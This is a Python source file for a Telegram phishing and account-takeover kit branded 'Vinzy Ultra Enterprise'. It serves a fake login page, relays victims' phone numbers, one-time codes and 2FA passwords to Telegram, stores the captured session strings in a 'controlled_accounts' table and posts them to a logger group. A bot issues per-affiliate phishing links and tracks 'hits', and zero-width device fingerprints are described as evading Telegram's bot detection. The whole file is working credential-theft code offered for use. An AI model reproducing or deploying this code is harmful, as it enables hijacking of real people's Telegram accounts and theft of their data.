"""
VINZY ULTRA ENTERPRISE - VERSION 3.6.0 (STABLE RELEASE)
Project: Vinzy Store Digital Services
Architecture: Asynchronous MTProto Hybrid with Ghost Spoofing
System: Optimized for 2026 Protocols & PostgreSQL Clustering
Developer: Vinzy Core Pro Engine
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- 1. GLOBAL CONFIGURATION & SECURITY PROTOCOLS ---

# Critical API Credentials
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# Absolute Pathing for Template Discovery
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FOLDER = os.path.join(BASE_DIR, "templates")

# 2026 Ghost Device Fingerprinting (Zero-Width Spoofing)
# These profiles bypass Telegram's automated bot-detection filters.
GHOST_POOL = [
    {"model": "\u200b", "sys": "\u200b", "app": "11.5.0"},
    {"model": "\u00A0", "sys": "\u00A0", "app": "11.4.2"},
    {"model": "\u200c", "sys": "\u200c", "app": "11.5.0"},
    {"model": "\u200d", "sys": "\u200d", "app": "11.3.1"},
    {"model": "\ufeff", "sys": "\ufeff", "app": "11.6.0"},
    {"model": " ", "sys": " ", "app": "11.7.0"},
    {"model": "\u2060", "sys": "\u2060", "app": "11.4.5"},
    {"model": "iPhone 15 Pro", "sys": "iOS 17.4", "app": "10.9.1"},
    {"model": "Samsung S24 Ultra", "sys": "Android 14", "app": "10.8.0"}
]

# Advanced Logging Engine Setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [%(name)s:%(lineno)d] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Core_Pro")

# Initialize Primary Application Objects
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# High-Performance In-Memory Session Storage
# Used for temporary handshakes between Web Client and Telegram MTProto
active_mirrors = {}

# --- 2. DATABASE ARCHITECTURE (POSTGRESQL CLUSTERING) ---

def get_db():
    """Establishes connection to the PostgreSQL cluster with SSL requirements."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def sync_database():
    """Builds and optimizes the 2026 data schema for high-load operations."""
    logger.info("DATABASE: Running structural integrity check...")
    try:
        conn = get_db()
        cur = conn.cursor()
        
        # Accounts Master Table: Stores full captured sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_used TEXT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        """)
        
        # Agent Metric Tracking: Real-time analytics for users
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                revenue REAL DEFAULT 0.0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Security Audit Logs: Tracks unauthorized access attempts
        cur.execute("""
            CREATE TABLE IF NOT EXISTS security_audit (
                id SERIAL PRIMARY KEY,
                event_type TEXT,
                details TEXT,
                ip_address TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("DATABASE: Structural sync complete. Cluster Healthy.")
    except Exception as e:
        logger.error(f"DATABASE FATAL: {str(e)}")

# Immediate Trigger for Database Syncing
sync_database()

# --- 3. ADVANCED UTILITIES & SECURITY REAPER ---

def clean_phone(p):
    """Normalization for international phone formats."""
    return re.sub(r'\D', '', str(p))

async def session_maintenance_task():
    """Asynchronous reaper to clear memory of abandoned login attempts every 2 minutes."""
    while True:
        try:
            now = time.time()
            expired = [p for p, d in active_mirrors.items() if now - d['timestamp'] > 600]
            
            for phone in expired:
                logger.info(f"CLEANUP: Removing stale session for {phone}")
                try:
                    await active_mirrors[phone]['client'].disconnect()
                except:
                    pass
                if phone in active_mirrors:
                    del active_mirrors[phone]
        except Exception as e:
            logger.error(f"MAINTENANCE_ERROR: {e}")
        await asyncio.sleep(120)

# --- 4. WEB ENGINE (API & MTPROTO ROUTES) ---

@app.route('/')
async def serve_index():
    """Primary Entry: Serves the login page to the target."""
    try:
        return await send_from_directory(TEMPLATE_FOLDER, 'login.html')
    except Exception as e:
        logger.error(f"WEB_ERROR: login.html failure - {e}")
        return "<h1>404: Template Missing</h1>", 404

@app.route('/mirror')
async def serve_mirror():
    """Mirror Sync: Serves mirror.html for real-time Telegram replication."""
    try:
        return await send_from_directory(TEMPLATE_FOLDER, 'mirror.html')
    except Exception as e:
        logger.error(f"WEB_ERROR: mirror.html failure - {e}")
        return "<h1>404: Mirror Template Missing</h1>", 404

@app.route('/step_phone', methods=['POST'])
async def handle_phone():
    """Phase 1: MTProto Handshake initiation."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        tid = int(data.get('tid', 0))

        if not phone or len(phone) < 7:
            return jsonify({"status": "error", "msg": "Invalid phone format."})

        # Selection of Device Profile for Ghost Connection
        ghost = random.choice(GHOST_POOL)
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            device_model=ghost['model'], 
            system_version=ghost['sys'],
            app_version=ghost['app']
        )
        
        await client.connect()

        # Log click metric immediately
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                last_activity = CURRENT_TIMESTAMP
            """, (tid,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as db_err:
            logger.warning(f"DB_METRIC_FAIL: {db_err}")

        # Trigger Telegram OTP
        sent_code = await client.send_code_request(phone)
        
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": ghost['model'],
            "timestamp": time.time()
        }
        
        logger.info(f"AUTH_INIT: Code sent to {phone} for Agent {tid}")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Wait {e.seconds}s (Flood)"})
    except Exception as e:
        logger.error(f"PHONE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Telegram API Busy."})

@app.route('/step_code', methods=['POST'])
async def handle_code():
    """Phase 2: Code Verification."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        code = data.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
            return await process_successful_login(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except Exception as e:
            return jsonify({"status": "error", "msg": str(e)})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Verification error."})

@app.route('/step_2fa', methods=['POST'])
async def handle_2fa():
    """Phase 3: 2FA Password Submission."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        pwd = data.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session timed out."})

        client = active_mirrors[phone]['client']
        active_mirrors[phone]['timestamp'] = time.time()

        try:
            await client.sign_in(password=pwd)
            return await process_successful_login(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Wrong 2FA password."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Security protocol error."})

async def process_successful_login(phone):
    """Phase 4: Capture Data, Persist to DB, and Alert Agent."""
    try:
        mirror = active_mirrors[phone]
        client = mirror['client']
        tid = mirror['tid']
        
        me = await client.get_me()
        s_str = client.session.save()
        
        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Telegram User"
        user = f"@{me.username}" if me.username else "N/A"

        # Persistence Layer
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_used) 
            VALUES (%s, %s, %s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, hit_date = CURRENT_TIMESTAMP
        """, (phone, s_str, name, user, tid, mirror['device']))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # Build Data Card for Logger Group
        card = (
            f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🏷 <b>User:</b> {user}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent ID:</b> <code>{tid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{s_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, card)

        # Notify Agent of Success
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Login Secured!</b>\nTarget <b>{name}</b> captured.\nCheck /stats.")

        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Capture failed."})

# --- 5. AGENT BOT COMMANDS (INTERACTIVE INTERFACE) ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    """Core Welcome Sequence."""
    text = (
        f"<b>Vinzy Ultra Enterprise v3.6.0</b>\n"
        f"<i>2026 Secured MTProto Management</i>\n\n"
        f"<b>Status:</b> 🟢 <b>Operational</b>\n"
        f"<b>Agent ID:</b> <code>{m.from_user.id}</code>\n"
        f"<b>Network:</b> Phnom Penh Secure Node"
    )
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("🔗 My Link", "📊 My Stats", "🛠 Support", "💎 VIP Hub")
    bot.send_message(m.chat.id, text, reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def cmd_link(m):
    """Dynamic Link Generator with Unique Agent TID."""
    link = f"https://relieved-olly-vinzystorez-d76f3e98.koyeb.app/?id={m.from_user.id}"
    msg = (
        f"🚀 <b>Your Dynamic Link:</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"<b>Features:</b>\n"
        f"• Real-time Mirroring\n"
        f"• Auto-2FA Detection\n"
        f"• Invisible Fingerprinting"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def cmd_stats(m):
    """Real-time performance analytics for the agent."""
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
        row = cur.fetchone()
        cur.close()
        conn.close()
        
        c = row[0] if row else 0
        h = row[1] if row else 0
        cr = round((h/c)*100, 1) if c > 0 else 0
        
        res = (
            f"📊 <b>Performance Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🖱 <b>Clicks:</b> {c}\n"
            f"🎯 <b>Hits:</b> {h}\n"
            f"📈 <b>Conversion:</b> {cr}%\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(m.chat.id, res)
    except Exception as e:
        bot.send_message(m.chat.id, "❌ Database unreachable.")

@bot.message_handler(commands=['admin'])
def cmd_admin(m):
    """Restricted Administrator Control Center."""
    if m.from_user.id != ADMIN_ID: return
    bot.send_message(m.chat.id, "🛠 <b>Admin Console</b>\nSystem: Healthy\nInstances: 1 active")

# --- 6. RUNTIME BOOTLOADER (STABILITY ENHANCED) ---

def start_bot():
    """Fail-safe polling loop with automatic conflict resolution for Koyeb."""
    logger.info("BOOT: Launching Agent Bot Interface...")
    
    # Pre-clear webhooks to avoid Conflict 409
    try:
        bot.remove_webhook()
        logger.info("BOOT: Webhook cleared.")
    except:
        pass

    while True:
        try:
            bot.polling(none_stop=True, interval=2, timeout=20)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 409:
                logger.warning("CONFLICT: Duplicate instance. Retrying in 10s...")
                time.sleep(10)
            else:
                time.sleep(5)
        except Exception as e:
            logger.error(f"BOT_CRASH: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Initialize Async Background Tasks
    try:
        loop = asyncio.get_event_loop()
        loop.create_task(session_maintenance_task())
    except Exception as e:
        logger.warning(f"REAPER_WARN: {e}")

    # Launch Bot Thread
    Thread(target=start_bot, daemon=True).start()
    
    # Launch Quart Server
    logger.info("BOOT: Initializing Quart Web Services on Port 8000")
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# -------------------------------------------------------------------------
# END OF SYSTEM CORE - VINZY ULTRA v3.6.0
# -------------------------------------------------------------------------
